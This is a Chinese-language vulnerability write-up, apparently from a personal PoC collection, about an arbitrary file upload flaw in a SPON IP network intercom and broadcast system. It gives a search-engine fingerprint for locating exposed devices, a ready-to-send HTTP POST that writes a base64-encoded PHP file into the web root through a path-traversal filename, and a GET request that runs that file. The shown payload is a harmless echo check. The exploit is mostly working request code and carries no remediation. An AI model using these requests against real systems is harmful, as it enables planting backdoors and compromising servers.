# 海康威视SPON IP网络对讲广播系统busyscreenshotpush存在任意文件上传漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">Hikvision Intercom Broadcasting System是中国海康威视（Hikvision）公司的一个对讲广播系统。海康威视SPON IP网络对讲广播系统busyscreenshotpush存在任意文件上传漏洞，恶意攻击者可能会上传恶意的后门文件，使服务器失陷。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ 海康威视SPON IP网络对讲广播系统

# 三、资产测绘
+ Hunter：`web.body="vendors/custom/html5.min.js"`
+ 特征

![1704857140903-8dadddb1-8d90-42a6-9179-3cd4dca00c8b.png](./img/eEgA4wXoVftviTL4/1704857140903-8dadddb1-8d90-42a6-9179-3cd4dca00c8b-059681.png)

# 四、漏洞复现
```plain
POST /php/busyscreenshotpush.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Content-Length: 181
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1

jsondata[caller]=1&jsondata[callee]=1&jsondata[imagename]=..\..\..\Wnmp\WWW\upload\1_0_xjayuiwqzj.php&jsondata[imagecontent]=PD9waHAgZWNobyAxMTEqMTExOyB1bmxpbmsoX19GSUxFX18pOyA/Pg==
```

![1706074591038-de25acd2-2194-4a9f-aaf3-e39839d43b07.png](./img/eEgA4wXoVftviTL4/1706074591038-de25acd2-2194-4a9f-aaf3-e39839d43b07-196152.png)

上传文件位置

```plain
GET /upload/1_0_xjayuiwqzj.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36
Accept-Encoding: gzip, deflate
Connection: close
```

![1706074625976-5f0afac2-b803-4816-a5f8-1332bc07b28a.png](./img/eEgA4wXoVftviTL4/1706074625976-5f0afac2-b803-4816-a5f8-1332bc07b28a-044143.png)

[spon-网络对讲-busyscreenshotpush-任意文件上传.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222236974-3b0a8a41-ca74-4d04-8da4-26985556355d.yaml)



> 更新: 2024-02-29 23:57:17  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/omhkq94uk2gotskw>